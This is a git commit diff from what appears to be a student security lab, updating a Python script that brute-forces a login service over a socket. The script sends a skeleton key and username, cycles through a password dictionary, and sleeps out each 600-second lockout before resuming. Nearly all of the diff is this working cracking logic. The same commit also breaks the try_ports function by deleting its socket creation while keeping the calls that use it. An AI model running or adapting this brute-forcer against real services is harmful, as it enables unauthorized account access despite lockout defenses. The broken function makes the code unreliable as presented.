064dcafadb1cca7574582db3e0222cd25cfd41d0
Bobby Singh Dhillon <bosdhill@grunhilda.soe.ucsc.edu>
2019-02-03 22:21:24 -0800

    finally got it working

--- Lab2/checkports.py
+++ Lab2/checkports.py
@@ -2,6 +2,8 @@ import re
 import socket
 import time
 import datetime
+# import sys
+# sys.stdout = open('port.out', 'w')
 
 HOST = '192.168.1.10'
 SKELETONKEY = 'Passepartout'
@@ -16,59 +18,64 @@ def create_dict():
      return passwords
 
 # Assuming NO initial lockout
-def crack_password(PORT, s):
+def crack_password(PORT):
      passwords = create_dict()
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((HOST, PORT))
+     print("Sending skeletonkey...")
      s.sendall(SKELETONKEY)
-     time.sleep(2)
      data = s.recv(BYTES)
      print("Data received: %s" % data)
      print("Sending username...")
      s.sendall(CRUZID)
      data = s.recv(BYTES)
-     print("Data received: %s" % data)
-     for password in passwords:
-          print("\tSending password: %s" % password)
-          s.sendall(password)
-          data = s.recv(BYTES)
-          print("\tData received: %s" % data)
-          if data == '':
-               print("\tSleep for 602 seconds at %s" % str(datetime.datetime.now()))
+     print("Received: %s" % data)
+     i = -1
+     while True:
+          if data == 'Password: ':
+               i += 1
+               print("\tSending password %s..." % passwords[i])
+               s.sendall(passwords[i])
+               data = s.recv(BYTES)
+               print("Received: %s" % data)
+               if data == 'Incorrect password, goodbye.\n':
+                    print("\tThe password %s was incorrect. :C" % passwords[i])
+                    s.close()
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    print("\tReconnecting to %s over port %d..." % (HOST, PORT))
+                    s.connect((HOST, PORT))
+                    print("Sending skeletonkey...")
+                    s.sendall(SKELETONKEY)
+                    data = s.recv(BYTES)
+                    print("Data received: %s" % data)
+                    print("\tSending username...")
+                    s.sendall(CRUZID)
+                    data = s.recv(BYTES)
+                    print("Received: %s" % data)
+               else:
+                    print("Password cracked! Password is %s" % passwords[i])
+                    break
+          elif data == 'Too many failed login attempts, account is locked for the next 600 seconds, goodbye.\n':
+               print("\tOut of tries!")
+               print("\t\tSleep for %d seconds at %s" % (602, str(datetime.datetime.now())))
                s.close()
                time.sleep(602)
+               s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+               print("\t\tReconnecting to %s over port %d..." % (HOST, PORT))
                s.connect((HOST, PORT))
+               print("Sending skeletonkey...")
                s.sendall(SKELETONKEY)
-               time.sleep(2)
                data = s.recv(BYTES)
-               print("\tData received: %s" % data)
-               print("\tSending username...")
-               s.sendall(CRUZID)
-               data = s.recv(BYTES)
-               print("\tData received: %s" % data)
-          elif data == "Incorrect password, goodbye.\n":
-               print("\tThe password %s is incorrect." % password)
-               s.close()
-               time.sleep(2)
-               s.connect((HOST, PORT))
-               s.sendall(SKELETONKEY)
-               time.sleep(2)
-               data = s.recv(BYTES)
-               print("\tData received: %s" % data)
-               print("\tSending username...")
-               s.sendall(CRUZID)
-               data = s.recv(BYTES)
-               print("\tData received: %s" % data)
-          else:
-               print("The password %s is correct!" % password)
                print("Data received: %s" % data)
+               print("\t\tSending username...")
+               s.sendall(CRUZID)
+               data = s.recv(BYTES)
 
 def try_ports():
      fp = open("out", "r")
      for _, line in enumerate(fp):
           port = re.findall("[0-9]{5}", line)
           PORT = int(port[0])
-          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect((HOST, PORT))
           s.sendall(SKELETONKEY)
           time.sleep(2)
@@ -77,11 +84,10 @@ def try_ports():
           data = s.recv(BYTES)
           if data == 'Password: ':
                print('Received %s from port %d' % (repr(data), PORT))
-               crack_password(PORT, s)
+               crack_password(PORT)
 
 if __name__ == "__main__":
-     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-     crack_password(10247, s)
+     crack_password(10247)
 
 
 
